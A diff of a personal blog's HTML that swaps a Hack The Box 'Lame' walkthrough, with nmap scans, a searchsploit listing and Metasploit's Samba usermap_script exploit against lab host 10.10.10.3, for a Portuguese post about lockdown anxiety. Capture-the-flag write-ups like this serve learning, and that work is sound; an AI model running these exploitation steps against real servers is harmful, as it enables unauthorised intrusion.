@@ -7,42 +7,44 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="generator" content="Hugo 0.70.0 with theme Tranquilpeak 0.4.7-BETA">
 <meta name="author" content="Tiago Tavares">
-<meta name="keywords" content="hackthebox">
-<meta name="description" content="Lame - Hack The Box retired machine walkthrough.">
+<meta name="keywords" content="">
+<meta name="description" content="">
 
 
-<meta property="og:description" content="Lame - Hack The Box retired machine walkthrough.">
+<meta property="og:description" content="">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Lame - Hack The Box (Retired)">
-<meta name="twitter:title" content="Lame - Hack The Box (Retired)">
-<meta property="og:url" content="https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
-<meta property="twitter:url" content="https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
+<meta property="og:title" content="A dor do confinamento">
+<meta name="twitter:title" content="A dor do confinamento">
+<meta property="og:url" content="https://tiagotavares.io/2020/05/a-dor-do-confinamento/">
+<meta property="twitter:url" content="https://tiagotavares.io/2020/05/a-dor-do-confinamento/">
 <meta property="og:site_name" content="debugging the life">
-<meta property="og:description" content="Lame - Hack The Box retired machine walkthrough.">
-<meta name="twitter:description" content="Lame - Hack The Box retired machine walkthrough.">
+<meta property="og:description" content="">
+<meta name="twitter:description" content="">
 <meta property="og:locale" content="en-us">
 
   
-    <meta property="article:published_time" content="2020-05-14T16:31:51">
+    <meta property="article:published_time" content="2020-05-23T19:50:51">
   
   
-    <meta property="article:modified_time" content="2020-05-14T16:31:51">
+    <meta property="article:modified_time" content="2020-05-23T19:50:51">
   
   
   
     
-      <meta property="article:section" content="📜Walkthroughs">
-    
-      <meta property="article:section" content="👨‍💻HackTheBox">
+      <meta property="article:section" content="⏳Life">
     
   
   
     
-      <meta property="article:tag" content="hackthebox">
+      <meta property="article:tag" content="life">
     
-      <meta property="article:tag" content="hacking">
+      <meta property="article:tag" content="vida">
     
-      <meta property="article:tag" content="ctf">
+      <meta property="article:tag" content="coronavirus">
+    
+      <meta property="article:tag" content="confinamento">
+    
+      <meta property="article:tag" content="quarantine">
     
   
 
@@ -59,8 +61,8 @@
 
 
 
-  <meta property="og:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589483960/blog/fb2d9f98400e3c802a0d7145e125c4ff_fytbfk.png">
-  <meta property="twitter:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589483960/blog/fb2d9f98400e3c802a0d7145e125c4ff_fytbfk.png">
+  <meta property="og:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1590274171/blog/passaros_gaiola_quarentena_kj6ai4.jpg">
+  <meta property="twitter:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1590274171/blog/passaros_gaiola_quarentena_kj6ai4.jpg">
 
 
 
@@ -70,14 +72,14 @@
   <meta property="twitter:image" content="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=640">
 
 
-    <title>Lame - Hack The Box (Retired)</title>
+    <title>A dor do confinamento</title>
 
     <link rel="icon" href="images/favicon-32x32.png">
     
 
     
 
-    <link rel="canonical" href="https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
+    <link rel="canonical" href="https://tiagotavares.io/2020/05/a-dor-do-confinamento/">
 
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
@@ -260,15 +262,15 @@ if (!doNotTrack) {
             <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      Lame - Hack The Box (Retired)
+      A dor do confinamento
     </h1>
   
   
   <div class="postShorten-meta post-meta">
     
-      <time itemprop="datePublished" datetime="2020-05-14T16:31:51-03:00">
+      <time itemprop="datePublished" datetime="2020-05-23T19:50:51-03:00">
         
-  May 14, 2020
+  May 23, 2020
 
       </time>
     
@@ -277,9 +279,7 @@ if (!doNotTrack) {
   
     <span>in</span>
     
-      <a class="category-link" href="https://tiagotavares.io/categories/walkthroughs">📜Walkthroughs</a>, 
-    
-      <a class="category-link" href="https://tiagotavares.io/categories/hackthebox">👨‍💻HackTheBox</a>
+      <a class="category-link" href="https://tiagotavares.io/categories/life">⏳Life</a>
     
   
 
@@ -289,142 +289,14 @@ if (!doNotTrack) {
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p>Lame - Hack The Box retired machine walkthrough.</p>
-<h2 id="-enumeration">🔎 Enumeration</h2>
-<pre><code>   root@kali:~# nmap -sV -A -O 10.10.10.3
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-14 16:20 -03
-Nmap scan report for 10.10.10.3
-Host is up (0.15s latency).
-Not shown: 996 filtered ports
-PORT    STATE SERVICE     VERSION
-21/tcp  open  ftp         vsftpd 2.3.4
-|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| ftp-syst: 
-|   STAT:                                                                                                                                                                                                                                  
-| FTP server status:                                                                                                                                                                                                                       
-|      Connected to 10.10.14.34                                                                                                                                                
-|      Logged in as ftp                                                                                                                                                        
-|      TYPE: ASCII                                                                                                                                                             
-|      No session bandwidth limit                                                                                                                                              
-|      Session timeout in seconds is 300                                                                                                                                       
-|      Control connection is plain text
-|      Data connections will be plain text
-|      vsFTPd 2.3.4 - secure, fast, stable
-|_End of status
-22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-| ssh-hostkey: 
-|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
-|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Arris TG862G/CT cable modem (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 2 hops
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-|_clock-skew: mean: 2h05m59s, deviation: 2h49m46s, median: 5m56s
-| smb-os-discovery: 
-|   OS: Unix (Samba 3.0.20-Debian)
-|   Computer name: lame
-|   NetBIOS computer name: 
-|   Domain name: hackthebox.gr
-|   FQDN: lame.hackthebox.gr
-|_  System time: 2020-05-14T15:26:52-04:00
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-|_smb2-time: Protocol negotiation failed (SMB2)
-
-TRACEROUTE (using port 21/tcp)
-HOP RTT       ADDRESS
-1   153.27 ms 10.10.14.1
-2   153.37 ms 10.10.10.3
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 69.37 seconds
-</code></pre>
-<p>nmap &ndash;script smb-enum-shares.nse -p445 10.10.10.3
-Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-14 18:17 -03</p>
-<pre><code>    Nmap scan report for 10.10.10.3
-    Host is up (0.15s latency).
-    
-    PORT    STATE SERVICE
-    445/tcp open  microsoft-ds
-    
-    Host script results:
-    | smb-enum-shares: 
-    |   account_used: &lt;blank&gt;
-|   \\10.10.10.3\ADMIN$: 
-|     Type: STYPE_IPC
-|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
-|     Users: 1
-|     Max Users: &lt;unlimited&gt;
-|     Path: C:\tmp
-|     Anonymous access: &lt;none&gt;
-|   \\10.10.10.3\IPC$: 
-|     Type: STYPE_IPC
-|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
-|     Users: 1
-|     Max Users: &lt;unlimited&gt;
-|     Path: C:\tmp
-|     Anonymous access: READ/WRITE
-|   \\10.10.10.3\opt: 
-|     Type: STYPE_DISKTREE
-|     Comment: 
-|     Users: 1
-|     Max Users: &lt;unlimited&gt;
-|     Path: C:\tmp
-|     Anonymous access: &lt;none&gt;
-|   \\10.10.10.3\print$: 
-|     Type: STYPE_DISKTREE
-|     Comment: Printer Drivers
-|     Users: 1
-|     Max Users: &lt;unlimited&gt;
-|     Path: C:\var\lib\samba\printers
-|     Anonymous access: &lt;none&gt;
-|   \\10.10.10.3\tmp: 
-|     Type: STYPE_DISKTREE
-|     Comment: oh noes!
-|     Users: 1
-|     Max Users: &lt;unlimited&gt;
-|     Path: C:\tmp
-|_    Anonymous access: READ/WRITE
-
-Nmap done: 1 IP address (1 host up) scanned in 67.23 seconds
-</code></pre>
-<h2 id="-foothold">🚪🚶 Foothold</h2>
-<p>For some reason, I couldn&rsquo;t exploit <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523">vsftpd 2.3.4</a>, which is  vulnerable.</p>
-<p>Let&rsquo;s try smb service.</p>
-<pre><code>root@kali:~# searchsploit samba 3.0.20
----------------------------------------------------------- ---------------------------------
- Exploit Title                                            |  Path
----------------------------------------------------------- ---------------------------------
-Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass    | multiple/remote/10095.txt
-Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command | unix/remote/16320.rb
-Samba &lt; 3.0.20 - Remote Heap Overflow                     | linux/remote/7701.txt
-Samba &lt; 3.0.20 - Remote Heap Overflow                     | linux/remote/7701.txt
-Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)             | linux_x86/dos/36741.py
----------------------------------------------------------- ---------------------------------
-</code></pre>
-<p>Looking further for infos on the internet and reading some docs, I could find the following:
-<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447</a></p>
-<p>Thankfully Metasploit already has a good exploit to explore it:</p>
-<pre><code># msfconsole
-msf5 &gt; use exploit/multi/samba/usermap_script
-msf5 exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3
-rhost =&gt; 10.10.10.3
-msf5 exploit(multi/samba/usermap_script) &gt; run
-</code></pre>
-<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589492675/blog/Image_bh1wc8.png" alt="enter image description here"></p>
-<h2 id="-privilege-escalation">🛡️ Privilege Escalation</h2>
-<p>Not needed. Samba service runs as root user.</p>
-<h2 id="-complete">🍻 Complete</h2>
-<p>As usual, you can get your <strong>root flag</strong> at /root/root.txt and user flag at /home/makis, as shown bellow:</p>
-<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589492306/blog/temp_l5rcml.png" alt="enter image description here"></p>
+              <p>Neste momento de pandemia, o coronavirus tem mudado as vidas de todas as pessoas ao redor do mundo. Famílias sendo ceifadas por este agressivo vírus e todos na esperança de tratamentos mais eficientes e vacinas para que a vida em comunidade possar voltar ao normal, onde abraços e beijos possam existir novamente.</p>
+<p>Falando como corredor, principalmente como pessoa extramamente ativa, não imaginava que algo fosse pior que uma lesão séria, que pode nos tirar de um investimento financeiro e físico, além do planejamento de meses . A pior lesão neste caso é o confinamento. Hoje estou próximo dos três meses de quarentena.</p>
+<p>É engraçado como é fácil se perder no tempo, a semana passa, e não sabemos que dia é, as vezes me perco até em que mês estou. A única coisa que faz prender-me ao calendário é o trabalho, esse compromisso, que graças a Deus até o dia de hoje não foi afetado.</p>
+<p>O medo o tempo todo ameaça a tomar conta da minha mente, preocupação com minha família, meus pais, meus sogros e tudos que são próximos de nós. Trabalho extra para conseguir me manter são.</p>
+<p>As vezes dizemos que não existe melhor remédio para qualquer angústia do que o foco no trabalho, mas infelizmente nem sempre é assim. Crises de ansiedade e falta de foco está aí para nos tirar dos trilhos. Essa é uma nova experiência que senti na pele durante este período, psiquiatra e remédio controlado.</p>
+<p>Tenho uma esposa linda e carinhosa, que tem me ajudado e cuidado de mim neste momento difícil, além do nosso filho, Moisés, um chihuahua medroso de aproximadamente 1 ano. Ele é adotado, não sabemos ao certo.</p>
+<p>Só posso agradecer por ter uma família, um teto pra morar, um trabalho que me deu a oportunidade de trabalhar remotamente e que me dá totais condições de viver bem e ajudar outras pessoas.</p>
+<p>Escrevo este texto para mim mesmo, dizendo que tudo isso vai passar, e que lá na frente será mais um episódio na história da humanidade, que eu estive presente e aprendi alguma coisa com tudo isso. ✌️</p>
               
             </div>
           </div>
@@ -436,11 +308,15 @@ msf5 exploit(multi/samba/usermap_script) &gt; run
                   <div class="post-footer-tags">
                     <span class="text-color-light text-small">TAGGED IN</span><br/>
                     
-  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/hackthebox/">hackthebox</a>
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/life/">life</a>
 
-  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/hacking/">hacking</a>
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/vida/">vida</a>
 
-  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/ctf/">ctf</a>
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/coronavirus/">coronavirus</a>
+
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/confinamento/">confinamento</a>
+
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/quarantine/">quarantine</a>
 
                   </div>
                 
@@ -453,7 +329,7 @@ msf5 exploit(multi/samba/usermap_script) &gt; run
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/05/a-dor-do-confinamento/" data-tooltip="A dor do confinamento">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -461,7 +337,7 @@ msf5 exploit(multi/samba/usermap_script) &gt; run
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/04/openadmin-hack-the-box-retired/" data-tooltip="OpenAdmin - Hack The Box (Retired)">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/05/lame-hack-the-box-retired/" data-tooltip="Lame - Hack The Box (Retired)">
               
                   <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                   <i class="fa fa-angle-right"></i>
@@ -479,19 +355,19 @@ msf5 exploit(multi/samba/usermap_script) &gt; run
         </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2020/05/a-dor-do-confinamento/">
               <i class="fa fa-facebook-official"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2020/05/a-dor-do-confinamento/">
               <i class="fa fa-twitter"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2020/05/a-dor-do-confinamento/">
               <i class="fa fa-google-plus"></i>
             </a>
           </li>
@@ -539,7 +415,7 @@ msf5 exploit(multi/samba/usermap_script) &gt; run
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/05/a-dor-do-confinamento/" data-tooltip="A dor do confinamento">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -547,7 +423,7 @@ msf5 exploit(multi/samba/usermap_script) &gt; run
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/04/openadmin-hack-the-box-retired/" data-tooltip="OpenAdmin - Hack The Box (Retired)">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/05/lame-hack-the-box-retired/" data-tooltip="Lame - Hack The Box (Retired)">
               
                   <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                   <i class="fa fa-angle-right"></i>
@@ -565,19 +441,19 @@ msf5 exploit(multi/samba/usermap_script) &gt; run
         </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2020/05/a-dor-do-confinamento/">
               <i class="fa fa-facebook-official"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2020/05/a-dor-do-confinamento/">
               <i class="fa fa-twitter"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2020/05/a-dor-do-confinamento/">
               <i class="fa fa-google-plus"></i>
             </a>
           </li>
@@ -607,19 +483,19 @@ msf5 exploit(multi/samba/usermap_script) &gt; run
   <ul class="share-options">
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftiagotavares.io%2F2020%2F05%2Flame-hack-the-box-retired%2F">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftiagotavares.io%2F2020%2F05%2Fa-dor-do-confinamento%2F">
           <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Ftiagotavares.io%2F2020%2F05%2Flame-hack-the-box-retired%2F">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Ftiagotavares.io%2F2020%2F05%2Fa-dor-do-confinamento%2F">
           <i class="fa fa-twitter"></i><span>Share on Twitter</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Ftiagotavares.io%2F2020%2F05%2Flame-hack-the-box-retired%2F">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Ftiagotavares.io%2F2020%2F05%2Fa-dor-do-confinamento%2F">
           <i class="fa fa-google-plus"></i><span>Share on Google&#43;</span>
         </a>
       </li>
@@ -709,9 +585,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/tiagotavares.io\/2020\/05\/lame-hack-the-box-retired\/';
+          this.page.url = 'https:\/\/tiagotavares.io\/2020\/05\/a-dor-do-confinamento\/';
           
-            this.page.identifier = '\/2020\/05\/lame-hack-the-box-retired\/'
+            this.page.identifier = '\/2020\/05\/a-dor-do-confinamento\/'
           
         };
         (function() {
